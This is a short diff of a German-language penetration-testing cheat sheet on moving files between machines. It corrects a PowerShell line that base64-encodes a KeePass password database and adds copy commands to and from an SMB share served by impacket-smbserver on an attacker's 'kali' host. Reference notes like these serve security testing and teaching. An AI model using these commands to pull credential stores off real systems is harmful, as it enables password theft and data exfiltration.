@@ -329,8 +329,7 @@ Start-BitsTransfer -Source "http://url_zur_datei" -Destination "lokaler_Pfad\Dat
 ```
 
 ```powershell
-[convert]::ToBase64String((Get-Content -path "C:\users\bob\documents\Database.kdbx"
--Encoding byte))
+[convert]::ToBase64String((Get-Content -path "C:\users\bob\documents\Database.kdbx" -Encoding byte))
 ```
 
 =>
@@ -348,5 +347,11 @@ impacket-smbserver -smb2support kali .
 ```
 
 ```powershell
-copy file \\127.0.0.1\kali
+copy-item file \\127.0.0.1\kali -Recurse
 ```
+
+bzw.
+```powershell
+copy-item \\127.0.0.1\kali file
+```
+
